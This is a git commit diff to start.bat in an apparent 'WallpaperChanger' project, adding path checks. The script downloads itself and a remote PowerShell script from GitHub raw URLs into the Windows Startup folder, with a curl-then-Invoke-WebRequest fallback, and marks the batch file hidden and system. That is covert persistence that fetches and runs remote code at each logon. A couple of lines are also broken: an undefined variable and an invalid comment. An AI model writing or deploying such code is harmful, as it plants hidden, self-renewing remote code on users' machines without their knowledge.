65faeba5320a6778a3d071e3094973235fb485eb
iakzs <k@iakzs.is-a.dev>
2024-10-10 20:34:04 -0300

    added checks of path

--- start.bat
+++ start.bat
@@ -3,21 +3,35 @@ setlocal enabledelayedexpansion
 
 set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/set.ps1
 set scriptPath1=%userprofile%\AppData\Local\Temp\set.ps1
-::set scriptPath2=%userprofile%\Documents\set.ps1
 set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\set.ps1
+
+set batchURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat
 set batchPath=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat
 
+echo Checking for the existence of %batchPath%...
 if not exist "%batchPath%" (
-    copy "%~f0" "%batchPath%"
-    attrib +h +s "%batchPath%"
+    echo Downloading batch file from %batchURL%...
+    curl -o "%batchPath%" "%batchURL%"
+    if %errorlevel% neq 0 (
+        echo curl download failed for batch file, switching to Invoke-WebRequest.
+        powershell -Command "Invoke-WebRequest -Uri '%batchURL%' -OutFile '%batchPath%'"
+    )
+
+    if not exist "%batchPath%" (
+        echo Failed to download %batchPath%. Exiting.
+        pause
+        exit /b 1
+    ) else (
+        echo Batch file download succeeded.
+        attrib +h +s "%batchPath%"  # Hide and system-protect the batch file
+    )
 )
 
 :checkloop
 
 echo Checking for the existence of %scriptPath1%...
 if not exist "%scriptPath1%" (
-    echo Downloading script from %scriptURL%...
-
+    echo Downloading to %scriptPath% (from %scriptURL%)...
     curl -o "%scriptPath1%" "%scriptURL%"
     if %errorlevel% neq 0 (
         echo curl download failed, switching to Invoke-WebRequest.
